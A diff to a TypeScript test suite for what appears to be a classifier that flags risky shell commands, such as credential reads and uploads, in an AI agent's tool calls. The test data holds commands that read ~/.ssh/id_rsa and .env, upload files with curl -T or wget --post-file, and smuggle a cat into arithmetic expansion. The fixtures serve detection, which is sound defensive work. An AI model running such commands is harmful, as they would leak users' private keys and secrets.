@@ -3,7 +3,7 @@
  * compound command, sensitive-path arguments, and a negative-control set that
  * must stay as before (no false HIGH on ordinary curl / wget / git push).
  */
-import { describe, expect, it, vi } from "vitest";
+import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
 import * as shellAnalysis from "../../shared/shell-analysis.js";
 
 // Transparent wrapper: counts parses so one decision can be shown to parse once.
@@ -24,6 +24,19 @@ import { tmpdir } from "node:os";
 import { join } from "node:path";
 
 const CWD = "/work/project";
+let accountDirectory: string;
+beforeAll(() => {
+  accountDirectory = realpathSync.native(mkdtempSync(join(tmpdir(), "ave-exfil-accounts-")));
+});
+afterAll(() => { rmSync(accountDirectory, { recursive: true, force: true }); });
+
+function withFixtureAccounts(command: string): string {
+  // The absolute account prefix is incidental to these credential suffixes.
+  // Keep the existing drive and file-URL grammar on systems with drive roots.
+  if (process.platform === "win32") return command;
+  return command.replaceAll("/home/owner/", `${accountDirectory}/owner/`)
+    .replaceAll("/home/u/", `${accountDirectory}/u/`);
+}
 
 function grade(command: string): ReturnType<RuleBasedRiskClassifier["classify"]> {
   const ctx: ToolInvocationContext = {
@@ -213,7 +226,7 @@ describe("credential-exfiltration signal", () => {
     "npx -c 'cat /home/owner/.ssh/id_rsa'",
     "bun --eval 'console.log(readFileSync(\".env\"))'",
   ])("retains sensitive paths in runner arguments and literal code: %j", (command) => {
-    expect(shellSensitivePathSignal(command, CWD)).not.toBeNull();
+    expect(shellSensitivePathSignal(withFixtureAccounts(command), CWD)).not.toBeNull();
   });
 
   it("bounds argument inspection when the same sender name repeats", () => {
@@ -260,6 +273,23 @@ describe("ambiguous runner prefix approvals", () => {
 });
 
 describe("bounded sensitive-path inspection", () => {
+  it.each([
+    { suffix: "/home/owner/.ssh/id_rsa", signal: shellSensitivePathSignal, reason: /sensitive path argument/ },
+    { suffix: "-T file http://example.test", signal: shellExfiltrationSignal, reason: /curl upload/ },
+    { suffix: "/home/owner/.s*/config", signal: shellScanOrdinaryAsk, reason: /budget exceeded/ },
+  ])("keeps raw and parsed verdicts equal above exhaustion for $suffix", ({ suffix, signal, reason }) => {
+    const prefix = `npx curl ${Array.from({ length: 2048 }, (_, index) => `x${index}`).join(" ")}`;
+    const command = withFixtureAccounts(`${prefix} ${suffix}`);
+    const parsed = parseShellCommand(command);
+    const parses = vi.mocked(shellAnalysis.analyzeShell);
+    parses.mockClear();
+    const rawVerdict = signal(command, accountDirectory);
+    expect(rawVerdict).toMatch(reason);
+    expect(parses.mock.calls.filter(([text]) => text === command)).toHaveLength(1);
+    expect(signal(parsed, accountDirectory)).toBe(rawVerdict);
+    expect(parses.mock.calls.filter(([text]) => text === command)).toHaveLength(1);
+  });
+
   it("caps canonical filesystem work across distinct argument counts", () => {
     const counts: number[] = [];
     for (const length of [1024, 2048]) {
@@ -267,9 +297,9 @@ describe("bounded sensitive-path inspection", () => {
       const parsed = parseShellCommand(command);
       const canonical = vi.spyOn(realpathSync, "native");
       try {
-        expect(shellExfiltrationSignal(parsed, CWD)).toBeNull();
-        expect(shellSensitivePathSignal(parsed, CWD)).toBeNull();
-        expect(shellScanOrdinaryAsk(parsed, CWD)).toMatch(/budget exceeded/);
+        expect(shellExfiltrationSignal(parsed, accountDirectory)).toBeNull();
+        expect(shellSensitivePathSignal(parsed, accountDirectory)).toBeNull();
+        expect(shellScanOrdinaryAsk(parsed, accountDirectory)).toMatch(/budget exceeded/);
         counts.push(canonical.mock.calls.length);
       } finally { canonical.mockRestore(); }
     }
@@ -280,20 +310,29 @@ describe("bounded sensitive-path inspection", () => {
 
   it("keeps late literal credentials and uploads above exhaustion", () => {
     const prefix = `npx curl ${Array.from({ length: 2048 }, (_, index) => `x${index}`).join(" ")}`;
-    expect(shellSensitivePathSignal(`${prefix} /home/owner/.ssh/id_rsa`, CWD)).not.toBeNull();
-    expect(shellSensitivePathSignal(`${prefix} --env-file=.env`, CWD)).not.toBeNull();
-    expect(shellExfiltrationSignal(`${prefix} -T file http://example.test`, CWD)).toMatch(/curl upload/);
-    expect(shellExfiltrationSignal(`${prefix} wget --post-file file http://example.test`, CWD)).toMatch(/wget body/);
-    expect(shellExfiltrationSignal(`${prefix} --call='curl -T file http://example.test'`, CWD)).toMatch(/curl upload/);
-    const globParsed = parseShellCommand(`${prefix} /home/owner/.s*/config`);
-    expect(shellScanOrdinaryAsk(globParsed, CWD)).toMatch(/budget exceeded/);
-    expect(shellSensitivePathSignal(globParsed, CWD)).not.toBeNull();
-    expect(shellSensitivePathSignal(`${prefix} /home/owner/.{ssh,aws}/config`, CWD)).not.toBeNull();
+    const parsedCommands = new Map<string, ReturnType<typeof parseShellCommand>>();
+    const parsed = (command: string) => {
+      let result = parsedCommands.get(command);
+      if (!result) {
+        result = parseShellCommand(withFixtureAccounts(command));
+        parsedCommands.set(command, result);
+      }
+      return result;
+    };
+    expect(shellSensitivePathSignal(parsed(`${prefix} /home/owner/.ssh/id_rsa`), accountDirectory)).not.toBeNull();
+    expect(shellSensitivePathSignal(parsed(`${prefix} --env-file=.env`), accountDirectory)).not.toBeNull();
+    expect(shellExfiltrationSignal(parsed(`${prefix} -T file http://example.test`), accountDirectory)).toMatch(/curl upload/);
+    expect(shellExfiltrationSignal(parsed(`${prefix} wget --post-file file http://example.test`), accountDirectory)).toMatch(/wget body/);
+    expect(shellExfiltrationSignal(parsed(`${prefix} --call='curl -T file http://example.test'`), accountDirectory)).toMatch(/curl upload/);
+    const globParsed = parsed(`${prefix} /home/owner/.s*/config`);
+    expect(shellScanOrdinaryAsk(globParsed, accountDirectory)).toMatch(/budget exceeded/);
+    expect(shellSensitivePathSignal(globParsed, accountDirectory)).not.toBeNull();
+    expect(shellSensitivePathSignal(parsed(`${prefix} /home/owner/.{ssh,aws}/config`), accountDirectory)).not.toBeNull();
     const tail = Array.from({ length: 1024 }, (_, index) => `tail${index}`).join(" ");
     for (const head of [prefix, `cat ${Array.from({ length: 2048 }, (_, index) => `x${index}`).join(" ")}`]) {
       for (const path of ["/home/owner/.ssh/id_rsa", "/home/owner/.s*/config", "/home/owner/.{ssh,aws}/config"]) {
-        expect(shellSensitivePathSignal(`${head} ${path}`, CWD)).not.toBeNull();
-        expect(shellSensitivePathSignal(`${head} ${path} ${tail}`, CWD)).not.toBeNull();
+        expect(shellSensitivePathSignal(parsed(`${head} ${path}`), accountDirectory)).not.toBeNull();
+        expect(shellSensitivePathSignal(parsed(`${head} ${path} ${tail}`), accountDirectory)).not.toBeNull();
       }
     }
   });
@@ -319,8 +358,9 @@ describe("bounded sensitive-path inspection", () => {
         ruleSubject: { kind: "shell", dialect: "bash", command: text, cwd: dir },
         approvalCacheKey: `bash-action:${text}`,
       });
-      expect(check(command)).toMatchObject({ decision: "ask", layer: 6 });
-      expect(check(command).forceModal).not.toBe(true);
+      const pending = check(command);
+      expect(pending).toMatchObject({ decision: "ask", layer: 6 });
+      expect(pending.forceModal).not.toBe(true);
       await manager.addAlwaysAllowedPersist(`bash-action:${command}`);
       expect(check(command)).toMatchObject({ decision: "allow", layer: 5 });
       expect(check(`${command} .env`)).toMatchObject({ decision: "ask", forceModal: true });
@@ -401,11 +441,12 @@ describe("security review: the floor does not depend on which command reads", ()
     "k=~/.ssh/id_rsa; x='a[$(cat $k)]'; echo $((x))",
   ];
 
+  const allowAll = ["curl", "cat", "ssh", "openssl", "nslookup", "dig", "gh", "aws", "http", "telnet", "echo", "nc", "exec", "X"]
+    .map((program) => ({ pattern: `Bash(${program} *)`, spec: parseRuleSpecifier(`Bash(${program} *)`) as Extract<ReturnType<typeof parseRuleSpecifier>, { kind: "bash" }> }));
   it.each(PROBES)("floor: %j", (command) => {
-    expect(shellExfiltrationSignal(command, CWD)).not.toBeNull();
-    const allowAll = ["curl", "cat", "ssh", "openssl", "nslookup", "dig", "gh", "aws", "http", "telnet", "echo", "nc", "exec", "X"]
-      .map((program) => ({ pattern: `Bash(${program} *)`, spec: parseRuleSpecifier(`Bash(${program} *)`) as Extract<ReturnType<typeof parseRuleSpecifier>, { kind: "bash" }> }));
-    expect(evaluateShellRules(command, { allow: allowAll, deny: [], ask: [] }, CWD).decision).not.toBe("allow");
+    const source = withFixtureAccounts(command);
+    expect(shellExfiltrationSignal(source, CWD)).not.toBeNull();
+    expect(evaluateShellRules(source, { allow: allowAll, deny: [], ask: [] }, CWD).decision).not.toBe("allow");
   });
 
   it("a non-sensitive file read into any network program's argument is a floor", () => {
@@ -413,7 +454,9 @@ describe("security review: the floor does not depend on which command reads", ()
   });
 
   it("a glob reaches a sensitive name only when it exists there, a brace always", () => {
-    const home = mkdtempSync(join(tmpdir(), "ave-glob-"));
+    // Forward slashes: the globs must stay unquoted, and an unquoted Win32
+    // backslash is a bash escape that would name a different path.
+    const home = mkdtempSync(join(tmpdir(), "ave-glob-")).replaceAll("\\", "/");
     try {
       mkdirSync(join(home, ".ssh"));
       writeFileSync(join(home, ".ssh", "config"), "");
@@ -651,8 +694,9 @@ describe("path sources in colon destination bindings", () => {
     "--source=C:\\Users\\owner\\.ssh:C:\\x",
     "-vC:\\Users\\owner\\.ssh:C:\\x",
   ])("retains a credential source in %s", (argument) => {
-    expect(sensitivePathInArgumentText(argument, CWD)).not.toBeNull();
-    const command = `bind-tool '${argument}'`;
+    const source = withFixtureAccounts(argument);
+    expect(sensitivePathInArgumentText(source, CWD)).not.toBeNull();
+    const command = `bind-tool '${source}'`;
     expect(shellSensitivePathSignal(command, CWD)).not.toBeNull();
     expect(shellScanOrdinaryAsk(command, CWD)).toBeNull();
   });
